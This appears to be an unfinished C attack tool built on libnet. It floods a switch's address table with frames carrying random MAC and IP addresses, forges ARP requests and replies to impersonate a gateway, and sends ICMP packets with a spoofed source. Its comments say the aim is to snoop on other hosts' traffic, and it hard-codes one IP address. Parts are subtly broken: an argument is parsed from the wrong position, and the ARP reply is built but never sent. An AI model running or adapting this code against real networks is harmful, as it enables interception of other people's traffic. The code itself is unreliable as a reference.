
#include <pcap.h>
#include <libnet.h>

#define ETH_ALEN 6
#define IPV4_SIZE 20

#define ETH_MTU		1500
#define IP_NODELAY	(1<<3)
#define ETH_P_IP     0x0800
#define DEFAULT_DEV 	"eth0"

struct eth_hdr 
{
    unsigned char dst[ETH_ALEN];
    unsigned char src[ETH_ALEN];
    unsigned short ftype;
};

struct arp_hdr
{
    unsigned short  ar_hrd;         /* format of hardware address   */
    unsigned short  ar_pro;         /* format of protocol address   */
    unsigned char   ar_hln;         /* length of hardware address   */
    unsigned char   ar_pln;         /* length of protocol address   */
    unsigned short  ar_op;          /* ARP opcode (command)         */
    unsigned char	ar_sha[ETH_ALEN];	/* sender hardware address	*/
    unsigned char	ar_sip[4];		/* sender IP address		*/
    unsigned char	ar_tha[ETH_ALEN];	/* target hardware address	*/
    unsigned char	ar_tip[4];		/* target IP address		*/
};

struct ethframe
{
    unsigned char eth[sizeof (struct eth_hdr)];
    unsigned char arp[sizeof (struct arp_hdr)];
    unsigned char buf[ETH_MTU - sizeof(struct eth_hdr) - 
		      sizeof(struct arp_hdr)];
};

struct eth_pair
{
    unsigned char eth[ETH_ALEN];
    unsigned long ip;
};

/* This is temporary.. Future versions will include a file to search through
   for the dest */
unsigned long netmask;
unsigned long broadcast;

/* TODO: Ping the entire broadcast space 1 at a time.. listen for responses, 
 * and then build a list.. Or file.. 
 * 
 * This prolly will work for almost all switches.. I can't imagine a switch
 * that somehow implicitly knows which IP's are alive and valid at all times..
 * Such a switch couldn't even depend on arp, because what if a host had
 * an /etc/ethers file? 
 */
struct eth_pair *get_dest()
{
    static struct eth_pair pair;
    int rnd = rand();

    memcpy(pair.eth, &rnd, 4);
    pair.ip = (rand() & (~netmask)) | (broadcast & netmask);
 
    return &pair;
}

void write_ipether(struct link_int *iface, char *dev, struct eth_pair *src)
{
    unsigned char pkt[ETH_H + IP_H + UDP_H];
    struct eth_pair *dst = get_dest();
    
    libnet_build_ethernet(dst->eth, src->eth, ETHERTYPE_IP, NULL, 0, pkt);
    libnet_build_ip(UDP_H, 0, 0, 0, 2, IPPROTO_UDP, src->ip, dst->ip,
	    NULL, 0, pkt + ETH_H);
    libnet_build_udp(rand() % (0xffff-1024) + 1024, rand() % 1024, 
		     NULL, 0, pkt + ETH_H + IP_H);
    if(libnet_do_checksum(pkt+ETH_H, IPPROTO_IP, IP_H) == -1)
	perror("ipv4 cksum");
    if(libnet_do_checksum(pkt+ETH_H, IPPROTO_UDP, UDP_H) == -1)
	perror("ipv4 cksum");
    if(libnet_write_link_layer(iface, dev, pkt, sizeof(pkt)) 
	    != sizeof(pkt))
	perror("Write link layer");
}

void write_icmpether(struct link_int *iface, char *dev, struct eth_pair *dst,
	struct eth_pair *src)
{
    unsigned char pkt[ETH_H + IP_H + ICMP_ECHO_H];
    
    libnet_build_ethernet(dst->eth, src->eth, ETHERTYPE_IP, NULL, 0, pkt);
    libnet_build_ip(ICMP_ECHO_H, 0, 0, 0, 2, IPPROTO_ICMP, src->ip, dst->ip,
	    NULL, 0, pkt + ETH_H);
    libnet_build_icmp_echo(ICMP_ECHO, 0, 0, 0, NULL, 0, pkt + ETH_H + IP_H);
    if(libnet_do_checksum(pkt+ETH_H, IPPROTO_IP, IP_H) == -1)
	perror("ipv4 cksum");
    if(libnet_do_checksum(pkt+ETH_H, IPPROTO_ICMP, ICMP_ECHO_H) == -1)
	perror("ipv4 cksum");
    if(libnet_write_link_layer(iface, dev, pkt, sizeof(pkt)) 
	    != sizeof(pkt))
	perror("Write link layer");
}

/* TODO: Also want to try an experimental function which puts all hw addrs 
 * on the switch into my port
 */

void fill_port_table(struct link_int *iface, char *dev, 
		     unsigned long broadcast, unsigned long netmask, 
		     int nfill)
{
    int rnd;
    struct eth_pair src;
    
    while(nfill--)
    {
	rnd = rand();
	memcpy(src.eth, &rnd, 4);
	src.ip = (rand() & (~netmask)) | (broadcast & netmask);
	write_ipether(iface, dev, &src);
    }
    
    /*memset(src.eth, 0, ETH_ALEN);
    src.ip = (rand() & (~netmask)) | (broadcast & netmask);
    
    write_ipether(iface, dev, &src);
    
    memset(src.eth, 0xff, ETH_ALEN);
    src.ip = (rand() & (~netmask)) | (broadcast & netmask);

    write_ipether(iface, dev, &src); */
}

/* TODO: List of all IP's to snoop */
void arp_spoof_request(struct link_int *iface, char *dev, 
	unsigned char *gwip, unsigned char *tgtip)
{
    unsigned char pkt[ARP_H + ETH_H];
    unsigned char bcast[ETH_ALEN];
    unsigned char zero[ETH_ALEN];
    
    memset(bcast, 0xff, ETH_ALEN);
    memset(zero, 0x00, ETH_ALEN);
    
    libnet_build_ethernet(bcast, bcast, ETHERTYPE_ARP, NULL, 0, pkt); 
    libnet_build_arp(ARPHRD_ETHER, ETH_P_IP, ETH_ALEN, 4, ARPOP_REQUEST, bcast,
	    gwip, zero, tgtip, NULL, 0, pkt + ETH_H);
    if(libnet_write_link_layer(iface, dev, pkt, sizeof(pkt)) 
	    != sizeof(pkt))
	perror("Write link layer");
}

/* We really only need to spoof the gw.. It's just lagged enough usually that
 * we might just win the race :)*/
void arp_spoof_reply(struct link_int *iface, char *dev, struct arp_hdr *arp)
{
    unsigned char pkt[ETH_H + sizeof(struct arp_hdr)];
    unsigned char bcast[ETH_ALEN];
    unsigned char tmpIP[4];
    
    memset(bcast, 0xff, ETH_ALEN);
    
    memcpy(arp->ar_tha, arp->ar_sha, ETH_ALEN);
    memcpy(tmpIP, arp->ar_tip, 4);
    memcpy(arp->ar_tip, arp->ar_sip, 4);
    memcpy(arp->ar_sip, tmpIP, 4);
    memcpy(arp->ar_sha, bcast, ETH_ALEN);
    arp->ar_op = ARPOP_REPLY;
    libnet_build_ethernet(arp->ar_tha, arp->ar_sha, ETHERTYPE_ARP, 
	    (unsigned char *)arp, sizeof(struct arp_hdr), pkt);
}

char *hex2eth(char *hexaddr)
{
    static char h_dest[ETH_ALEN];
    int i;
    
    for(i=0; i < ETH_ALEN && hexaddr && *hexaddr != 0; i++, hexaddr++)
    {
	h_dest[i] = strtol(hexaddr, NULL, 16) & 0xff;
	hexaddr = strchr(hexaddr, ':');
    }
    return h_dest;
}

int main(int argc, char **argv)
{
    struct link_int *intf;
    int nconnect;
    char *dev = DEFAULT_DEV;
    struct timeval tv;
    struct eth_pair src, dst;
    
    gettimeofday(&tv, NULL);
    
    srand(tv.tv_sec ^ tv.tv_usec ^ (getpid()<<15));
    
    if(argc < 6)
    {
	printf("usage: %s <IP broadcast> <IP netmask> <gw ip> <gw hw> <nconnects>\n", argv[0]);
	exit(1);
    }
    nconnect = atoi(argv[3]);
    if((intf = libnet_open_link_interface(dev, NULL)) == NULL)
    {
	perror("open intf");
	exit(1);
    }
    netmask = libnet_name_resolve(argv[2], 0);
    broadcast = libnet_name_resolve(argv[1], 0);
    //fill_port_table(intf, dev, broadcast, netmask, nconnect);

    src.ip = rand();
    memcpy(src.eth, &src.ip, 4);
    src.ip = libnet_name_resolve("130.126.44.109", 0);

    memcpy(dst.eth, hex2eth(argv[4]), ETH_ALEN);
    dst.ip = libnet_name_resolve(argv[3], 0);
    
    write_icmpether(intf, dev, &dst, &src);
}
